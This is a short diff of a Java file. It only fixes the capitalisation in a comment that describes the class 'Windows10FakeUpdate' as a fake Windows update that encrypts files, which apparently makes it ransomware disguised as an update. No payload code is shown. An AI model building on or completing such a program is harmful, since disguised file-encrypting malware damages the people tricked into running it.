@@ -6,7 +6,7 @@ import java.io.File;
 import java.net.MalformedURLException;
 import java.net.URL;
 
-//fake windows update that encrypts files
+//fake Windows update that encrypts files
 
 public class Windows10FakeUpdate {
     public static void main(String[] args) {
